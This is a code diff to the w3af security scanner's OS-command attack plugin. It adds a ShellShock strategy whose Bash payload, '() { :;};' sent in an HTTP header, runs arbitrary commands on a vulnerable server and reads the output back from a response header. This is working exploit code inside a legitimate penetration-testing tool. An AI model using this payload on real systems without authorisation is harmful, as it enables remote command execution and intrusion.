@@ -19,11 +19,14 @@ along with w3af; if not, write to the Free Software
 Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
 """
+import base64
+
 import w3af.core.controllers.output_manager as om
 import w3af.plugins.attack.payloads.shell_handler as shell_handler
 
 from w3af.core.data.kb.exec_shell import ExecShell
 from w3af.core.data.fuzzer.utils import rand_alpha
+from w3af.core.data.fuzzer.mutants.headers_mutant import HeadersMutant
 from w3af.core.controllers.plugins.attack_plugin import AttackPlugin
 from w3af.core.controllers.exceptions import BaseFrameworkException
 from w3af.core.controllers.misc.common_attack_methods import CommonAttackMethods
@@ -36,10 +39,8 @@ class ExploitStrategy(object):
     can use to execute commands and get the results.
     """
     def __init__(self, vuln):
-        self._cmd_separator = vuln['separator']
-        self._remote_os = vuln['os']
         self.vuln = vuln
-    
+
     def send(self, cmd, opener):
         mutant = self.vuln.get_mutant().copy()
         mutant.set_token_value(cmd)
@@ -47,7 +48,7 @@ class ExploitStrategy(object):
                 
     def can_exploit(self, opener):
         raise NotImplementedError
-    
+
     def generate_command(self, command):
         raise NotImplementedError
     
@@ -55,12 +56,26 @@ class ExploitStrategy(object):
         raise NotImplementedError
 
 
-class BasicExploitStrategy(ExploitStrategy, CommonAttackMethods):
+class SeparatorExploitStrategy(ExploitStrategy):
     def __init__(self, vuln):
-        ExploitStrategy.__init__(self, vuln)
+        super(SeparatorExploitStrategy, self).__init__(vuln)
+
+        self._cmd_separator = self.vuln['separator']
+        self._remote_os = self.vuln['os']
+
+
+class BasicExploitStrategy(SeparatorExploitStrategy, CommonAttackMethods):
+    def __init__(self, vuln):
+        SeparatorExploitStrategy.__init__(self, vuln)
         CommonAttackMethods.__init__(self)
-        
+
     def can_exploit(self, opener):
+        if 'separator' not in self.vuln:
+            return False
+
+        if 'os' not in self.vuln:
+            return False
+
         # Define a test command:
         rand = rand_alpha(8)
         expected_output = rand + '\n'
@@ -86,7 +101,7 @@ class BasicExploitStrategy(ExploitStrategy, CommonAttackMethods):
         return self._cut(http_response.get_body())
 
 
-class FullPathExploitStrategy(ExploitStrategy):
+class FullPathExploitStrategy(SeparatorExploitStrategy):
     """
     This strategy allows us to retrieve binary output from the commands we run
     without any errors. Also, it returns exactly the bytes returned by the
@@ -128,7 +143,50 @@ class CmdsInPathExploitStrategy(FullPathExploitStrategy):
     """
     REMOTE_CMD = "%s echo -n '%s'; %s | base64 | "\
                  "tr -d '\n'; echo -n '%s'"
-                 
+
+
+class ShellShock(ExploitStrategy):
+    """
+    Exploit shell-shock vulnerabilities which require us to send the payload
+    in a header. We exploit it in such a way that the response also comes in
+    a (response) header.
+    """
+    INJECTED_HEADER = 'Shock'
+    PATH = '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:' \
+           '/usr/games:/usr/local/games'
+    NEW_LINE = '@@n-.'
+
+    # Even after applying the variables above this is a format string which
+    # receives the command to run. Note the %%s below:
+    PAYLOAD_FMT = '() { :;};PATH=$PATH:%s;%%s | sed "s/$/%s/" | tr -d "\\n\\r"'\
+                  ' | /usr/bin/awk "{print \\"%s: \\"\$0\\"\\n\\"}"'
+    PAYLOAD_FMT = PAYLOAD_FMT % (PATH, NEW_LINE, INJECTED_HEADER)
+
+    def send(self, cmd, opener):
+        mutant = self.vuln.get_mutant().copy()
+        mutant.set_token_value(cmd)
+        return opener.send_mutant(mutant)
+
+    def can_exploit(self, opener):
+        if not isinstance(self.vuln.get_mutant(), HeadersMutant):
+            return False
+
+        test_command = 'echo -n w3af'
+        http_response = self.send(self.generate_command(test_command), opener)
+        return self.extract_result(http_response) == 'w3af'
+
+    def generate_command(self, command):
+        return self.PAYLOAD_FMT % command
+
+    def extract_result(self, http_response):
+        header_value, _ = http_response.get_headers().iget(self.INJECTED_HEADER)
+
+        if header_value is None:
+            return 'Shell shock command execution failed.'
+
+        header_value = header_value.strip()
+        return header_value.replace(self.NEW_LINE, '\n').strip()
+
 
 class os_commanding(AttackPlugin):
     """
@@ -137,7 +195,7 @@ class os_commanding(AttackPlugin):
     :author: Andres Riancho (andres.riancho@gmail.com)
     """
     EXPLOIT_STRATEGIES = [FullPathExploitStrategy, CmdsInPathExploitStrategy,
-                          BasicExploitStrategy]
+                          BasicExploitStrategy, ShellShock]
     
     def __init__(self):
         AttackPlugin.__init__(self)
@@ -154,7 +212,7 @@ class os_commanding(AttackPlugin):
         to exploit. For example, if the audit.os_commanding plugin finds a
         vuln, and saves it as:
 
-        kb.kb.append( 'os_commanding' , 'os_commanding', vuln )
+        kb.kb.append('os_commanding', 'os_commanding', vuln)
 
         Then the exploit plugin that exploits os_commanding
         (attack.os_commanding) should return ['os_commanding',] in this method.
@@ -162,7 +220,7 @@ class os_commanding(AttackPlugin):
         If there is more than one location the implementation should return
         ['a', 'b', ..., 'n']
         """
-        return ['os_commanding',]
+        return ['os_commanding', 'shell_shock']
 
     def _generate_shell(self, vuln):
         """
@@ -188,8 +246,12 @@ class os_commanding(AttackPlugin):
         :return : True if vuln can be exploited.
         """
         for StrategyKlass in self.EXPLOIT_STRATEGIES:
-            
-            strategy = StrategyKlass(vuln)
+
+            try:
+                strategy = StrategyKlass(vuln)
+            except KeyError:
+                om.out.debug('%s can not exploit %s' % (StrategyKlass, vuln))
+                continue
             
             msg = 'Trying to exploit vuln %s using %s.'
             om.out.debug(msg % (vuln.get_id(), strategy))
